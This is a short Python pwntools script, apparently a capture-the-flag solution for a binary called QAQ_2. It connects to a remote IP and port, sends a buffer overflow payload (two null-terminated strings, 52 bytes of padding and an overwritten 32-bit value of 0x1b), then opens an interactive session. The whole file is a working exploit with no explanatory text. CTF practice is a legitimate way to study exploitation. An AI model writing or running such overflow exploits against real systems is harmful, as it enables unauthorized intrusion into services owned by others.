from pwn import *
#p=process("./QAQ_2")
p=remote("121.40.92.129",28074)
#gdb.attach(p)
buf="aaaaaaaaa\0"
s2="aaaaaaaaa\0"
payload=buf+s2+"a"*52+p32(0x1b)
p.sendline(payload)
p.interactive()
